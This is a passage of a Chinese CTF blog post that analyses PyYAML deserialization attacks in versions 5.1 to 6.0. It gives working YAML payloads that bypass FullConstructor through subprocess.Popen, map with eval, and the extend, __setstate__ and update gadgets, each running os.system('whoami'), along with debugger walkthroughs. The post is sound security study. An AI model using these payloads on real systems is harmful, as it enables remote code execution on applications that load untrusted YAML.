+<p>因为在不指定 Loader 的时候，默认是 FullConstructor 构造器。这对开发人员起到了提醒的作用。<br>除此之外，在 make_python_instance 还新增的额外的限制：if not (unsafe or isinstance(cls, type))，也就是说，在安全模式下，加载进来的 module.name 必须是一个类（例如 int、str 之类的），否则就会报错。</p>
+<p>常规利用方式：<br>常规的利用方式和 &lt;5.1 版本的姿势是一样的。当然前提是构造器必须用的是 UnsafeConstructor 或者 Constructor，也就是这种情况：</p>
+<ol>
+<li>yaml.unsafe_load(exp)</li>
+<li>yaml.unsafe_load_all(exp)</li>
+<li>yaml.load(exp, Loader&#x3D;UnsafeLoader)</li>
+<li>yaml.load(exp, Loader&#x3D;Loader)</li>
+<li>yaml.load_all(exp, Loader&#x3D;UnsafeLoader)</li>
+<li>yaml.load_all(exp, Loader&#x3D;Loader)</li>
+</ol>
+<h2 id="FullConstructor-BreakOut"><a href="#FullConstructor-BreakOut" class="headerlink" title="FullConstructor BreakOut"></a>FullConstructor BreakOut</h2><p>如何突破FullConstructor呢？FullConstructor 中，限制了只允许加载 sys.modules 中的模块。这个有办法突破吗？我们先列举一下限制：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676296120745-df2b73cd-6d8b-472a-ac86-4f514f25ce35.png#averageHue=%232d2c2b&clientId=u4f2b0c03-b33a-4&from=paste&height=412&id=ube4647d4&name=image.png&originHeight=515&originWidth=1324&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=88153&status=done&style=none&taskId=ua55d2474-37ec-454f-b5a5-a89d90a41cb&title=&width=1059.2" alt="image.png"></p>
+<ol>
+<li>只引用，不执行的限制：<ol>
+<li>加载进来的 module 必须是位于 sys.modules 中</li>
+</ol>
+</li>
+<li>引用并执行：<ol>
+<li>加载进来的 module 必须是位于 sys.modules 中</li>
+<li>FullConstructor 下，unsafe &#x3D; False，加载进来的 module.name 必须是一个类</li>
+</ol>
+</li>
+</ol>
+<p>举两个不行的例子：</p>
+<ol>
+<li>!!python&#x2F;name:pickle.loads：pickle 不在 sys.modules 中</li>
+<li>!!python&#x2F;object&#x2F;new:builtins.eval [“print(1)”]：eval 虽然在 sys.modules 中，但是 type(builtins.eval) 是 builtin_function_or_method 而不是一个类。</li>
+</ol>
+<p>那么最直接的思路就是，有没有一个模块，它在 FullConstructor 上下文中的 sys.modules 里，同时它还有一个类，这个类可以执行命令？答案就是 subprocess.Popen。所以最简单的 payload 就是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/apply:subprocess.Popen</span></span><br><span class="line"><span class="string">  - whoami</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>不用 !!python&#x2F;object&#x2F;apply 的话，也有其他办法。<br>通过遍历 builtins 下的所有方法，可以找到这些看起来有点用的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bool</span>、<span class="built_in">bytearray</span>、<span class="built_in">bytes</span></span><br><span class="line"><span class="built_in">complex</span></span><br><span class="line"><span class="built_in">dict</span></span><br><span class="line"><span class="built_in">enumerate</span></span><br><span class="line"><span class="built_in">filter</span>、<span class="built_in">float</span>、<span class="built_in">frozenset</span></span><br><span class="line"><span class="built_in">int</span></span><br><span class="line"><span class="built_in">list</span></span><br><span class="line"><span class="built_in">map</span>、<span class="built_in">memoryview</span></span><br><span class="line"><span class="built_in">object</span></span><br><span class="line"><span class="built_in">range</span>、<span class="built_in">reversed</span></span><br><span class="line"><span class="built_in">set</span>、<span class="built_in">slice</span>、<span class="built_in">str</span>、<span class="built_in">staticmethod</span></span><br><span class="line"><span class="built_in">tuple</span></span><br><span class="line"><span class="built_in">zip</span></span><br></pre></td></tr></table></figure>
+<p>其中的map和tuple结合起来可以触发命令执行，在py2中map直接返回的是列表，在py3返回一个迭代器，配合tuple可以执行命令<br><code>tuple(map(eval, [&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;]))</code><br>其中的tuple可以用<code>frozenset、Bytes</code>进行替代：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676296287874-307726b6-73e4-43c6-a6c6-703ffd64800c.png#averageHue=%23575757&clientId=u4f2b0c03-b33a-4&from=paste&height=718&id=ud12c746d&name=image.png&originHeight=898&originWidth=1577&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78857&status=done&style=none&taskId=u1332df93-e371-46e7-9f0f-28624007c2a&title=&width=1261.6" alt="image.png"><br>这里有个小bug，直接使用set和list也可以起到tuple一样的作用，解开map内容，但是通过 !!python&#x2F;object&#x2F;new 来使用时却会忽略参数，生成一个空的迭代对象：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676296502217-ca55ecb9-684b-4981-a37c-2d2f276be99b.png#averageHue=%235e5848&clientId=u4f2b0c03-b33a-4&from=paste&height=656&id=ua282b925&name=image.png&originHeight=820&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=87667&status=done&style=none&taskId=ufb72d8ca-0f65-478e-a5c1-dc9ac0a089c&title=&width=1536" alt="image.png"></p>
+<h3 id="extend-Attack"><a href="#extend-Attack" class="headerlink" title="extend Attack"></a>extend Attack</h3><p>在apply标签的<code>construct_python_object_apply</code>函数中有这么一条语句：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676301710315-43ee09a5-1680-4758-9f44-9a42c726ce25.png#averageHue=%232f2b2a&clientId=u0d310e85-46c4-4&from=paste&height=199&id=u90ee700f&name=image.png&originHeight=249&originWidth=1263&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40234&status=done&style=none&taskId=u4610aa95-f1ad-4f42-bfc3-a7f38c7c75f&title=&width=1010.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676301757451-9cbd028b-cabd-48ee-9631-2cf749b3dbd1.png#averageHue=%232f2b2a&clientId=u0d310e85-46c4-4&from=paste&height=182&id=u46c34db1&name=image.png&originHeight=227&originWidth=1088&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38185&status=done&style=none&taskId=ufc4aca71-4b59-4ecf-8d2d-065d63a9944&title=&width=870.4" alt="image.png"><br>如果存在listitem属性，那么会调用<code>instance.extend(listitems)</code>，假如这里的instance.extend为eval或者exec，listitems为恶意的payload，那就可以执行命令了，比如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yaml.full_load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:type</span></span><br><span class="line"><span class="string">args:</span></span><br><span class="line"><span class="string">  - exp</span></span><br><span class="line"><span class="string">  - !!python/tuple []</span></span><br><span class="line"><span class="string">  - &#123;&quot;extend&quot;: !!python/name:exec &#125;</span></span><br><span class="line"><span class="string">listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#等价于</span></span><br><span class="line">exp = <span class="built_in">type</span>(<span class="string">&quot;exp&quot;</span>, (,), &#123;<span class="string">&quot;extend&quot;</span>: <span class="built_in">eval</span>&#125;)</span><br><span class="line">exp.extend(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676302177089-3cefdbc8-aa65-48aa-a76d-e1e659257cdd.png#averageHue=%23738a80&clientId=u0d310e85-46c4-4&from=paste&height=763&id=u9f1a204c&name=image.png&originHeight=954&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=222340&status=done&style=none&taskId=u560efe20-36e8-4fc6-834a-19767dbc09d&title=&width=1536" alt="image.png"><br>和我们分析的一致</p>
+<h3 id="setstate-Attack"><a href="#setstate-Attack" class="headerlink" title="setstate Attack"></a>setstate Attack</h3><p>同样的也是在上面流程<code>construct_python_object_apply</code>函数中有：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676302224361-def0c062-8bbb-4232-a2fd-9a95fb786410.png#averageHue=%23827c5e&clientId=u0d310e85-46c4-4&from=paste&height=277&id=uff54ef7a&name=image.png&originHeight=346&originWidth=1416&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62274&status=done&style=none&taskId=u5583f49d-ddd6-491f-94cf-59748fbc412&title=&width=1132.8" alt="image.png"><br>进入了set_python_instance_state函数中<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676302283886-cca616cb-5626-4447-a4a7-df6705ed8ac9.png#averageHue=%23302b2a&clientId=u0d310e85-46c4-4&from=paste&height=354&id=uc6c61e2d&name=image.png&originHeight=442&originWidth=1388&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=65891&status=done&style=none&taskId=u35a7114e-1e3a-4a41-8661-2a4f1bfd643&title=&width=1110.4" alt="image.png"><br>如果instance中有<code>__setstate__</code>属性，会调用<code>instance.__setstate__(state)</code>，假如这时instance.__setstate__为eval或者exec，state为我们的恶意payload，这时候也和上面一样可以实现RCE，因此payload只需要改一改：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yaml.full_load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:type</span></span><br><span class="line"><span class="string">args:</span></span><br><span class="line"><span class="string">  - exp</span></span><br><span class="line"><span class="string">  - !!python/tuple []</span></span><br><span class="line"><span class="string">  - &#123;&quot;__setstate__&quot;: !!python/name:exec &#125;</span></span><br><span class="line"><span class="string">state: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#等价于</span></span><br><span class="line">exp = <span class="built_in">type</span>(<span class="string">&quot;exp&quot;</span>, (<span class="built_in">list</span>, ), &#123;<span class="string">&quot;__setstate__&quot;</span>: <span class="built_in">eval</span>&#125;)</span><br><span class="line">exp.__setstate__(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676302517377-dd8f33cd-7537-4658-a024-818ec0f6a6c4.png#averageHue=%2354665b&clientId=u0d310e85-46c4-4&from=paste&height=745&id=u9c19cb89&name=image.png&originHeight=931&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=189512&status=done&style=none&taskId=ua1513f8a-2430-4886-82ef-647ba440f64&title=&width=1536" alt="image.png"><br>同样和我们分析的一样</p>
+<h3 id="update-Attack"><a href="#update-Attack" class="headerlink" title="update Attack"></a>update Attack</h3><p>那么假如上述2种方法都用不了该怎么办呢？别急，我们回到<code>set_python_instance_state</code>函数流程中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676302771561-c05bc62c-7c58-4e86-8f3f-5440d354d056.png#averageHue=%232f2b2a&clientId=u0d310e85-46c4-4&from=paste&height=346&id=ua8405b91&name=image.png&originHeight=432&originWidth=1421&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=81073&status=done&style=none&taskId=u544d0ac6-1368-4efc-affc-2d56e6a3b9d&title=&width=1136.8" alt="image.png"><br>关键步骤在于<code>slotstate.update(state)</code>，如果slotstate.update为eval，state为payload，那么就可以RCE,和上面一模一样，所以payload可以为如下内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">yaml.full_load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:str</span></span><br><span class="line"><span class="string">    args: []</span></span><br><span class="line"><span class="string">    # 通过 state 触发调用</span></span><br><span class="line"><span class="string">    state: !!python/tuple</span></span><br><span class="line"><span class="string">      - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></span><br><span class="line"><span class="string">      # 下面构造 exp</span></span><br><span class="line"><span class="string">      - !!python/object/new:staticmethod</span></span><br><span class="line"><span class="string">        args: []</span></span><br><span class="line"><span class="string">        state: </span></span><br><span class="line"><span class="string">          update: !!python/name:eval</span></span><br><span class="line"><span class="string">          items: !!python/name:list  # 不设置这个也可以，会报错但也已经执行成功</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#等效</span></span><br><span class="line">exp = <span class="built_in">staticmethod</span>([<span class="number">0</span>])</span><br><span class="line">exp.__dict__.update(</span><br><span class="line">    &#123;<span class="string">&quot;update&quot;</span>: <span class="built_in">eval</span>, <span class="string">&quot;items&quot;</span>: <span class="built_in">list</span>&#125;</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 由于 str 没有 __dict__ 方法，所以在 PyYAML 解析时会触发下面调用</span></span><br><span class="line"></span><br><span class="line">exp.update(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>这个payload就比上面的长很多，因此分析的地方也复杂一些，首先流程是<strong>由内向外</strong>的，这句话怎么理解呢，当yaml解析的时候会先解析<code>- !!python/object/new:staticmethod</code>下面的语句，然后解析完之后，再将解析结果放入<code>state: !!python/tuple</code>,最后开始解析<code>!!python/object/new:str</code>，说起来可能大家也不太懂，这里就跟大B（bushi)来调试看看：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676303071477-4d3c5a91-3b63-4cdf-be3a-5dfcd1e35be6.png#averageHue=%238b8b6c&clientId=u0d310e85-46c4-4&from=paste&height=405&id=uca5f8bf0&name=image.png&originHeight=506&originWidth=1640&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=85819&status=done&style=none&taskId=u04689dc7-a107-4db2-afa4-0e4bd9c860d&title=&width=1312" alt="image.png"><br>第一次进入时，instance是一个staticmethod类型的对象，state就是最里面一层的，符合我们的解释，staticmethod方法是用来声明函数的静态方法的。在这里我们往里面存放了一个空值，不过问题不大，此时instance.__dict__为空（__dict__属性中存放了该对象的所有属性，变量，函数…..）：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676303259618-51a6fac7-1ddf-4e2f-8c9a-65f9f4cbce1d.png#averageHue=%233f4345&clientId=u0d310e85-46c4-4&from=paste&height=91&id=u562e9b20&name=image.png&originHeight=114&originWidth=875&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10370&status=done&style=none&taskId=ub3e767c0-33d3-42b3-bd28-a17d646afbb&title=&width=700" alt="image.png"><br>接着往下走，走到<code>instance.__dict__.update(state)</code>，这时调用了update方法，往__dict__字典中存放了state对象，这为第二次进入set_python_instance_state做了铺垫：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676303316010-9e823d50-3e5a-43fb-ba0e-9ffb21dd1325.png#averageHue=%23738370&clientId=u0d310e85-46c4-4&from=paste&height=627&id=ufd73b54c&name=image.png&originHeight=784&originWidth=1762&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=154664&status=done&style=none&taskId=uef633534-9fda-4cde-950c-517993a3e7f&title=&width=1409.6" alt="image.png"><br>那么随之就是第二次进入，回顾一开始说的顺序，由内到外，发现instance为str对象，state就是第一次进入后的结果加上恶意payload：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676303441016-e633d55f-97d9-40ec-8175-6638d655ffd6.png#averageHue=%23728471&clientId=u0d310e85-46c4-4&from=paste&height=561&id=ucef2b1ad&name=image.png&originHeight=701&originWidth=1695&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=115223&status=done&style=none&taskId=udca77bde-0961-4910-8556-efdf50ffbfd&title=&width=1356" alt="image.png"><br>之后注意，在<code>state, slotstate = state</code>中，完成了state和slsotstate的赋值，state是一个tuple元组，有2个元素，那么新的state和slotstate对象第一个和第二个元素:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676303564121-6d3ddc26-1a45-4dbb-8e21-fde51aadbfd7.png#averageHue=%236c7d77&clientId=u0d310e85-46c4-4&from=paste&height=505&id=u401907f9&name=image.png&originHeight=631&originWidth=1744&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=107919&status=done&style=none&taskId=u3bba357c-c896-4137-9e84-77cc26b4c20&title=&width=1395.2" alt="image.png"><br>最后就是进入<code>slotstate.update(state)</code>触发rce：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676303586897-da2e864d-2413-4522-a7b3-55c4b5d9318a.png#averageHue=%23998e65&clientId=u0d310e85-46c4-4&from=paste&height=450&id=u2e4eb5c7&name=image.png&originHeight=563&originWidth=1823&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=102861&status=done&style=none&taskId=u2f9029c4-83fb-472f-87ce-ae85850594e&title=&width=1458.4" alt="image.png"><br>到这里分析就结束啦，我觉得描述的已经很清晰了</p>
+<h1 id="5-2—6-0"><a href="#5-2—6-0" class="headerlink" title="5.2—6.0"></a>5.2—6.0</h1><ul>
+<li>在5.2中只额外支持 !!python&#x2F;name、!!python&#x2F;object、!!python&#x2F;object&#x2F;new 和 !!python&#x2F;module，而不支持apply标签了</li>
+<li>在5.3.1以上的版本中加了一个新的过滤机制，匹配到就报错</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676301314604-d691e4c7-f399-4c32-ad99-6a8eb2528a67.png#averageHue=%23292b20&clientId=u0d310e85-46c4-4&from=paste&id=uce098e8b&originHeight=306&originWidth=1720&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u3a6413bc-a349-4e85-83c5-3a74ed96e11&title="></p>
+<ul>
+<li>版本在5.4以上只支持!!python&#x2F;name，!!python&#x2F;object&#x2F;apply、!!python&#x2F;object、!!python&#x2F;object&#x2F;new了，moudle寄了</li>
+<li>6.0以上的版本用户必须指定Loader了，否则报错</li>
+</ul>
+<h1 id="可爱的尾巴"><a href="#可爱的尾巴" class="headerlink" title="可爱的尾巴"></a>可爱的尾巴</h1><p>PyYAML这个知识点一直拖欠着没有进行总结，因为总觉得是一个小知识点，今天分析的时候才发现调试和分析过程并没有我想象中的那么简单，但仍然是一个很有趣的过程，我也一直觉得CTF这项竞赛是比较优雅的智力比赛，不断的剖析原理，接触新的tricks才是CTF的乐趣所在，希望HnuSec的大家不要停下来啊！</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/反序列化/" class="tag">#反序列化</a><a href="/tags/Yaml/" class="tag">#Yaml</a><a href="/tags/Python/" class="tag">#Python</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/02/Agent%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%96%E6%9E%90/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">Agent内存马剖析</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/02/%E6%B5%85%E5%AD%A6RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">浅学RMI反序列化</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
